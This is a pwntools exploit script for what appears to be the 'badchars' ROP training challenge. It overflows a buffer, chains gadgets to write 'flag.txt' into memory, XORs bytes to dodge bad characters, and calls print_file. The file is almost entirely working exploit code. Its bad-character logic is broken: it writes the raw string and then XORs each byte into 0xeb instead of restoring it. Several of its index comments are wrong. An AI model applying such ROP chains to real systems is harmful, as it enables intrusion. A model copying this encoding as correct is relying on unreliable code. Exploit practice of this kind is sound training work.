from pwn import *
"""
Task:
    1. Write 'flag.txt' to file_name
    2. Fix badchar
"""

# gadget
e = ELF('./badchars')

print_file = e.symbols['print_file']
print(hex(print_file))
file_name = 0x00601500
flag_txt = u64("flag.txt")

mov_pr13_r12 = 0x0000000000400634           #: mov qword ptr [r13], r12 ; ret
pop_r12_r13_r14_r15 = 0x000000000040069c    #: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r14_r15 = 0x00000000004006a0            #: pop r14 ; pop r15 ; ret
xor_pr15_r14b = 0x0000000000400628          #: xor byte ptr [r15], r14b ; ret
pop_rdi = 0x00000000004006a3

def write8(where, what):
    buf = b""
    buf += p64(pop_r12_r13_r14_r15)
    buf += p64(what)
    buf += p64(where)
    buf += p64(0xc0ffee)                    # junk
    buf += p64(0xc0ffee)                    # junk
    buf += p64(mov_pr13_r12)
    return buf

def fix_bad(where, what):
    buf = b''
    buf += p64(pop_r14_r15)
    buf += p64(what ^ 0xeb)
    buf += p64(where)
    buf += p64(xor_pr15_r14b)
    return buf

def call_print_file(file_name):
    buf = b''
    buf += p64(pop_rdi)
    buf += p64(file_name)
    buf += p64(print_file)
    return buf

def exploit():
    p = process("./badchars")

    # proc.wait_for_debugger(p.pid)

    buf = b""
    buf += b"A"*0x28
    
    buf += write8(file_name, flag_txt)
    buf += fix_bad(file_name+2, ord('a'))    # flag_txt[2] = a
    buf += fix_bad(file_name+3, ord('g'))    # flag_txt[2] = g
    buf += fix_bad(file_name+4, ord('.'))    # flag_txt[3] = .
    buf += fix_bad(file_name+6, ord('x'))    # flag_txt[3] = x
    buf += call_print_file(file_name)

    p.sendline(buf)

    p.recvuntil(">")
    p.interactive()

exploit()